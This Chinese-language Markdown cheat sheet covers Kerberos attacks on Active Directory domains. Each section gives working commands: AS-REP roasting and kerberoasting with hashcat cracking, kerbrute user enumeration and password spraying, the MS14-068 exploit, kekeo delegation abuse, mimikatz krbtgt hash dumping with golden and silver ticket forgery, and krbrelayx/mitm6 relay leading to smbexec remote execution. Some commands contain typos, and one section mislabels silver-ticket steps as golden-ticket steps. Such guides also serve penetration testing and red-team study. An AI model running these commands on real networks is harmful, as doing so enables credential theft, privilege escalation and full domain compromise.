# Kerberos攻击面

[TOC]

## 获取域用户

### AS-Reproasting

#### 攻击方式

- 检查**没有**开启**域身份认证**的用户

```powershell
lmport-Module .\powerview.ps1 Get-DomainUser -PreauthNotRequired
```

- 获取**没有开启域身份认证**的用户的**ASREPHash**

```powershell
lmport-Module .\ASREPRoast.ps1 Get-ASREPHash -UserName 没有开启域身份认证的用户名 -Domain 域名 | Out-File -Encoding ASCII hash.txt
```

- 在**hash.txt**文件中的**$krb5asrep**后拼接**$23**字符串

- 使用**hashcat**对**hash.txt**进行破解

```shell
hashcat.exe -m 18200 hash.txt password.dict --force
```

### kerberoasting

#### 攻击方式

- 破解用户选择，选择**服务账户**

  - 用户账户：密码由用户控制，定期修改，复杂程度较高

  - **服务账户**（推荐）：服务部署可能会使用弱口令，并且为了不影响业务，密码长期不修改

  - 机器账户：密码由机器随机生成，并且30天更换一次

- 使用**setspn**查询服务账户

```shell
setspn.exe -q /setspn.exe -T only -q / #指定域控
```

- 使用**mimikatz**请求票据

```shell
mimikatz.exe "kerberos::ask /target:XXXSvc/域名:端口 /export"
```

- 使用**tgsrepcrakc**破解**票据**获取明文**密码**

```shell
python tgsrepcrakc.py password.list 票据.kirbi
```

### 用户名枚举和密码爆破

#### 攻击方式

- 使用**kerbrute_windows_amd64**枚举**用户名**

```shell
kerbrute_windows_amd64.exe userenum --dc 域控ip -d 域名 用户名字典.txt
```

- 使用**kerbrute_windows_amd64**进行**密码爆破**

```shell
kerbrute_windows_amd64.exe passwordspray --dc 域控ip -d 域名 用户名字典.txt 固定密码
```

## 提升域用户权限

### MS14-068

| PrimaryGroupId | 用户组             |
| -------------- | ------------------ |
| 513            | 域用户             |
| 512            | 域管理员           |
| 518            | 架构管理员         |
| 519            | 企业管理员         |
| 520            | 组策略创建者所有者 |

#### 攻击方式

- 使用**MS14-068**的EXP对目标域账户进行提权

```shell
MS14-068.exe -u username@domain.com -p password -s SID -d 域控服务器域名
```

- 使用**mimikatz**导入票据

```shell
mimikatz "kerberos::ptc C:\Users\w10\Desktop\imimikatz_trunk\TGT wl0@cs.com.ccache"
```

### 约束委派与非约束委派

#### 攻击方式

- 使用**kekeo**请求**TGT**

```shell
kekeo.exe "tgt::ask /user:testl /domain:test.local /password:1qaz2WSX3edc /ticket:test1.kirbi"
```

- 使用**kekeo**请求**TGS**

```shell
kekeo.exe "tgs::s4u /tgt:TGT文件路径 /user:administrator@test.local /service:cifs /WIN-47FOF3S663D.test.local"
```

- 使用**kekeo**把**TGS**注入到当前会话

```shell
kekeo.exe "kerberos::ptt TGS票据路径"
```

### 基于资源的约束委派

//TODO

## 域用户权限维持

### 黄金票据

#### 利用条件

1. **域名称**
2. 域的**SID**值
3. 域的**KRBTGT**账号的**HASH**
4. 伪造**任意用户名**

#### 攻击方式

- 使用**mimikatz**获取**krbtgt**用户的**hash**

```shell
mimikatz.exe "lsadump::lsa /patch"
```

- 使用**mimikatz**伪造administrator用户的TGT

```shell
mimikatz.exe "Kerberos::golden /user:administrator /domain:test19.local /sid:S-1-5-21-2018703852-1585738866-2258721264 /krbtgt:6084e1bdfeb7b787c9c19e9f34cfb7e3 /ptt"
```

### 白银票据

#### 利用条件

1. 域名
2. 域SID
3. 目标服务器的FQDN即完整的域名
4. 可利用的服务
5. 服务账户的NTLM哈希
6. 伪造的用户名即任意用户名

#### 攻击方式

- 使用**mimikatz**获取**krbtgt**用户的**hash**

```shell
mimikatz.exe "lsadump::lsa /patch"
```

- 使用**mimikatz**伪造administrator用户的TGT

```shell
mimikatz.exe "kerberos::golden /domain:test.local /sid:S-1-5-21384343099-1350869772-3476002129 /target:WIN47F0F3S663D.test.local /service:cifs /rc4:13cf74746302253838e2f9bd312690c4 /user:administrator /ptt"
```

## Kerberos Relay

![](../images/Kerberos-Relay.jpg)

### 攻击方式

- 攻击机开启**krbrelayx**监听，获取目标服务器**机器账户**权限

```shell
python3 krbrelayx.py --target http://ADCS服务器域名/certsrv/ -ip 攻击机IP --victim 受害服务器域名 --adcs --template Machine
```

- 攻击机开启**mitm6**监听

```shell
mitm6 --domain relay.com --host-allowlist win10.relay.com --relay adcs.relay.com
```

- 等待目标机器进行IPv6记录更新查询，触发查询即可获取**base64证书数据**
- 获取**base64证书数据**后，使用**smbexec**远程执行命令

```shell
KRB5CCNAME=admin.ccache python smbexec.py -k test.com/Administrator@win-test.test.com -no-pass
```

#### CVE-2022-33647（强制认证漏洞）

//TODO